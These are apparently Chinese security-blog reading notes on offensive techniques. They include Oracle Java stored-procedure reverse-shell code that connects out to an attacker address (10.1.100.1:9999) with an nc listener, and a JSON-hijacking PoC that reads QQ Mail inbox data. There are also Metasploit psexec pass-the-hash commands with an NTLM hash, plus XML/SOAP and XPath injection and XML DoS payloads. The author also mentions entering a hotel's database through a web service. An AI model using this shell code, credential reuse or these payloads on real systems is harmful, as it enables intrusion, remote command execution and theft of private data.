OutputStream Os;&amp;nbsp;&amp;nbsp; DataInputStream DIS;&amp;nbsp;&amp;nbsp; PrintStream PS; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;try{ &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;socket=new Socket(addr,Integer.parseInt(str_port)); &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Is=socket.getInputStream(); &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Os=socket.getOutputStream(); &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DIS=new DataInputStream(Is); &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;PS=new PrintStream(Os); &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;while(true){ &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;s=DIS.readLine(); &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if(s.trim().equals(&quot;BYE&quot;))break; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;try{ &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Runtime rt = Runtime.getRuntime(); &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Process p = null; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;p = rt.exec(s); &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;s = null; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;String msg = null; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;while((msg = br.readLine())!=null){ &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;msg += &quot;\n&quot;; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;s += msg; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;} &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;br.close(); &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; } &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;catch(Exception e) &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{ &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;s = &quot;Please check your command!&quot;; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;} &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;PS.println(s); &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; } &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DIS.close(); &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;PS.close(); &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Is.close(); &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Os.close(); &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;socket.close();&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;} &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;catch(Exception e) &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{ &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;System.out.println(&quot;Error:&quot;+e); &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;} &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;} } create or replace procedure myjavasocket(address in varchar,port in varchar) as language java&amp;nbsp;&amp;nbsp; name &apos;javasocket.test(java.lang.String,java.lang.String)&apos;;&amp;nbsp;&amp;nbsp; `&lt;/pre&gt; 执行myjavasocket &lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`exec myjavasocket(&apos;10.1.100.1&apos;,&apos;9999&apos;); local: nc -l -p 9999 这样就可以得到了一个交互的shell了，不过有些不是exe文件的比如dir就得输入cmd.exe /c dir 来运行…. &nbsp;&nbsp; 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[读《一次SWF XSS挖掘和利用》]]></title>
    <url>%2F2015%2F03%2F31%2Fa220bc1abe07103310215dc390f96076%2F</url>
    <content type="text"><![CDATA[原文：http://drops.wooyun.org/papers/44 swf xss挖掘流程：&nbsp; &nbsp; 1.利用site:yourdomain.com filetype:swf 搜索指定域下的所有swf文件&nbsp; &nbsp; 2.再利用swf文件url在google中搜索含参数url（确认参数，静态分析快速定位；根据文件名和参数初步判断swf功能）&nbsp; &nbsp; 3.反编译swf静态分析，关键字定位（能执行js函数或语法）：‘ExternalInterface.call’, ‘getURL’, ‘navigateToURL’, ‘javascript:’等&nbsp; &nbsp; 4.确定“前因后果”，前因：关键变量是否可控且过滤不严或未过滤；后果：关键处理函数功能是否适合&nbsp; &nbsp; 5.追踪函数和变量，确定漏洞功能流程&nbsp; &nbsp;&nbsp; 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[读《Json hijacking/Json劫持漏洞》]]></title>
    <url>%2F2015%2F03%2F30%2Ff3ea25ae0c94f31c10679e52de20139d%2F</url>
    <content type="text"><![CDATA[原文：http://drops.wooyun.org/papers/42 json 劫持的利用： &amp;lt;script&amp;gt;&amp;nbsp;&amp;nbsp; function wooyun_callback(a){&amp;nbsp;&amp;nbsp; alert(a);&amp;nbsp;&amp;nbsp; }&amp;nbsp;&amp;nbsp; &amp;lt;/script&amp;gt;&amp;nbsp;&amp;nbsp; &amp;lt;script src=&quot;http://www.wooyun.org/userdata.php?callback=wooyun_callback&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;nbsp;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`&lt;!--more--&gt; `&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`qq邮箱案例：`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;` 通过构造URL让用户访问，可以获得QQ Mail的邮件列表。该漏洞由于需要在web QQ里共享QQ Mail里的邮件信息，所以QQ Mail开放了一个json接口以提供第三方的域名来获得QQ Mail的信息，但是由于该接口缺乏足够的认证，所以导致任何第三方域里都可以用script的方式来获取该邮件列表。 &lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); background-position: initial initial; background-repeat: initial initial;&quot;&gt;&lt;code style=&quot;margin: 0px; padding: 0px; font-family: &apos;Courier New&apos;, Courier, monospace; word-wrap: break-word;&quot;&gt;&amp;lt;script&amp;gt;&amp;nbsp;&amp;nbsp; var Qmail={};&amp;nbsp;&amp;nbsp; &amp;lt;/script&amp;gt;&amp;nbsp;&amp;nbsp; &amp;lt;script src=&quot;http://mail.qq.com/cgi-bin/login?fun=passport&amp;amp;target=MLIST&amp;amp;t=login.js&amp;amp;pagesize=10&amp;amp;resp_charset=gb2312&amp;amp;1=3&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;nbsp;&amp;nbsp; &amp;lt;script&amp;gt;&amp;nbsp;&amp;nbsp; alert(Qmail.newMailsList.nextUrl);&amp;nbsp;&amp;nbsp; alert(document.scripts[1].src=Qmail.newMailsList.nextUrl);&amp;nbsp;&amp;nbsp; alert(Qmail.newMailsList.summary);&amp;nbsp;&amp;nbsp; &amp;lt;/script&amp;gt;&amp;nbsp;&amp;nbsp;`&lt;/pre&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt; 修复方案： &lt;div&gt; 尽量避免跨域的数据传输，对于同域的数据传输使用xmlhttp的方式作为数据获取的方式，依赖于javascript在浏览器域里的安全性保护数据。如果是跨域的数据传输，必须要对敏感的数据获取做权限认证，具体的方式可以包括： &lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`1 referer的来源限制，利用前端referer的不可伪造性来保障请求数据的应用来源于可信的地方，此种方式力度较稀，完全依赖于referer，某些情况下（如存在xss）可能导致被绕过。 2 token的加入，严格来说，这种利用javascript hijacking的方式获取数据是CSRF的一种，不过较之传统的CSRF不能获取数据只能提交而言，这种方式利用javascript可以获取一些敏感信息而已。如果我们能让攻击者对接口未知，就可以实现json &amp;nbsp;hijacking的防御了。利用token对调用者的身份进行认证，这种方式对于调用者的身份会要求力度较细，但是一旦出现xss也可能导致前端Token的泄露，从而导致保护失效。 3 对于同域的json使用情况下，可以在数据的输出头部加入while(1);的方式避免数据被script标签的方式引用，这可以防止一些比较有特性的浏览器里导致的数据泄漏。 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[读《使用Hash直接登录Windows》]]></title>
    <url>%2F2015%2F03%2F30%2F006bdbdbef35aa1e6bf2b3245c973c5a%2F</url>
    <content type="text"><![CDATA[原文：http://drops.wooyun.org/page/53 使用gethashes.exe 获取本地hash： gethashes.exe $local`&lt;/pre&gt;&lt;/div&gt;&lt;!--more--&gt;&lt;div&gt; &lt;/div&gt;&lt;div&gt;使用msf中的psexec来hash登陆：&lt;/div&gt;&lt;div&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`use exploit/windows/smb/psexec`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`show options`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`set RHOST 192.168.0.254&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`set SMBUser wooyun&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`set SMBPass 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`exploit 来自为知笔记(Wiz):]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XML安全系列之Web Services]]></title>
    <url>%2F2015%2F03%2F28%2Fxml-e5-ae-89-e5-85-a8-e7-b3-bb-e5-88-97-e4-b9-8bweb-services%2F</url>
    <content type="text"><![CDATA[0x01 引言：&nbsp; &nbsp; 前段时间搞站遇到了TRS的系统里面涉及到了ws（Web Services简称）的相关技术，不久前玩一个xx酒店的时候又通过ws进入了它的数据库，后来接连遇到或看见一些app服务和物联网相关系统中出现XML相关漏洞，于是搜索相关资料做技术积累。如果文中出现错误，望指正。&nbsp; &nbsp;&nbsp;0x02 什么是WS：&nbsp; &nbsp;&nbsp;Web Service是基于网络的、分布式的模块化组件，它执行特定的任务，遵守具体的技术规范，这些规范使得Web Service能与其他兼容的组件进行互操作。&nbsp;Web Services 利用 SOAP 和 XML对这些模型在通讯方面作了进一步的扩展以消除特殊对象模型的障碍。Web Services 主要利用 HTTP 和 SOAP 协议使业务数据在 Web 上传输，SOAP通过 HTTP 调用业务对象执行远程功能调用，Web 用户能够使用 SOAP 和 HTTP通过 Web 调用的方法来调用远程对象的。（来至百度百科）。&nbsp; &nbsp; 简单的说WS就是http + XML，WS平台的元素有：SOAP、UDDI、WSDL。0x03 xml注入（soap注入）&nbsp; &nbsp; 以下将介绍一些利用场景，漏洞是千变万化的肯定不全，也不是每种环境都适用。&nbsp; &nbsp; 情景1：&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 漏洞：&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&lt;USER role=”guest”&gt;attacker’s code&lt;/USER&gt;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;poc:&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;A&lt;/USER&gt;&lt;USER role=”admin”&gt;B&nbsp; &nbsp;&nbsp;&nbsp;情景2：&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 漏洞：&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 改变了&lt;lname&gt;&lt;lname&gt;为空，通过返回错误发现loginid作为登陆判断：&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;poc:&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;结果bypass登陆：&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 情景3：&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &lt;transaction&gt;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &lt;total&gt;6000.00&lt;total&gt;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &lt;credit_card_number&gt;12345&lt;/credit_card_number&gt; //12345可控,覆盖&lt;total&gt;标签&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &lt;expiration&gt;01012008&lt;/expiration&gt;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&lt;/transaction&gt;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; poc:&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 12345&lt;/credit_card_number&gt;&lt;total&gt;1.00&lt;/total&gt;&lt;credit_card_number&gt;123450x03 SQL注入和xpath注入:&nbsp; &nbsp; 总所周知SQL注入，注入的是数据库，作为owasp top10的漏洞，存在相当的普遍，ws中也同样存在。wooyun上也同样存在案例http://www.wooyun.org/bugs/wooyun-2010-094720，这种ws上的sql注入漏洞也是非常容易被忽略的。至于sql注入的利用，不用多少，不同数据库不同注入手法，和我们常见的sql注入方法一样，并无区别。&nbsp; &nbsp; xpath注入，在wooyun上谈论的很少，中文资料也不是很多。简单的形容如果xml作为数据库的话xpath讲究相当与sql语句，因此如果服务器是用xml格式来存储数据，我们用xpath来调用数据，当传入参数过滤不严的时候，就可能照成xpath注入，当然xpath注入还有很多技巧和函数的使用以及和xxe结合使用之类的技巧，在此不多说。&nbsp; &nbsp; 举一ws注入xpath利用场景：&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &lt;sopaenv:Body&gt;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;web1:Login xmlns:web1=”http://ws.ws.com/“&gt; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &lt;username&gt;abc&lt;/username&gt;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &lt;password&gt;123&lt;/password&gt;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;/web1:Login&gt;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &lt;/sopaenv:Body&gt;&nbsp; &nbsp; 假如正常的xpath查询：string(//Employee[username/text()=’abc’ and password/text()=’123’]/account/text())&nbsp; &nbsp; 我们控制可以控制username或者password，输入‘ or ‘1’ = ‘1&nbsp; &nbsp; 最后xpath查询成为：string(//Employee[username/text()=’‘ or ‘1’ = ‘1‘ and password/text()=’‘ or ‘1’ = ‘1‘]/account/text())&nbsp; &nbsp; 绕过登陆，当让xpath的利用不知如此，比如使用doc()函数读取任意xml文件、使用doc()和xxe读取任意文件。0x04&nbsp;DDOS和XXE&nbsp; &nbsp; 为什么会有DDOS和XXE呢，前面已经说过了ws可以看成xml和http的结合，因此XML相关漏洞也是可能会出现在ws之中的，关于xml中的DDOS和XXE都是各位大牛都做了很多分析：&nbsp; &nbsp; DDOS上有：长数据DDOS、多标签DDOS&nbsp; &nbsp; 例如:&lt;transaction&gt;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &lt;total&gt;6000.00&lt;total&gt;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &lt;credit_card_number&gt;12345&lt;/credit_card_number&gt;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&lt;credit_card_number&gt;qqqq&lt;/credit_card_number&gt;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&lt;credit_card_number&gt;qqqq&lt;/credit_card_number&gt;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&lt;credit_card_number&gt;qqqq&lt;/credit_card_number&gt;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&lt;credit_card_number&gt;qqqq&lt;/credit_card_number&gt;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &lt;expiration&gt;01012008&lt;/expiration&gt;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&lt;/transaction&gt;&nbsp; &nbsp; xxe漏洞drops上已有文章：http://drops.wooyun.org/tips/5290，以及利用xxe漏洞DDOS，利用xxe漏洞SSRF、命令执行&nbsp; &nbsp; 关于这连个漏洞推荐两篇文章：《Having Fun with XML 